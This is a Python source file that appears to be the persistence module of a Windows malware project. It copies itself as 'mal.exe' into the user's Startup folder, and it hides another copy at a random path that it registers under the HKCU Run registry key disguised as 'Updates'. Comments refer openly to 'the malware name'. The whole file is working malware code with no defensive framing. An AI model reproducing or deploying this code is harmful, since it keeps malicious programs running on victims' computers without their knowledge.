import os
import shutil
import winreg
from func import generate_random_path


def persist():
    __create_registry_key()
    __copy_to_startup()


def __copy_to_startup():
    current_user = os.getenv("USERNAME") # Should become a wide scope variable, redundantly declared in multiple places
    startup_path = f"C:/Users/{current_user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/mal.exe"
    try:
        shutil.copyfile(__file__, startup_path)
    except shutil.SameFileError: # in case file already exists
        pass


def __create_registry_key():
    trigger_path = generate_random_path()
    shutil.copy(__file__, trigger_path + "mal.exe")

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS) as key:
            winreg.SetValueEx(key, 'Updates', 0, winreg.REG_SZ,
                              trigger_path + "/mal.exe")  # <- Should be changed to the malware name
    except OSError:
        pass


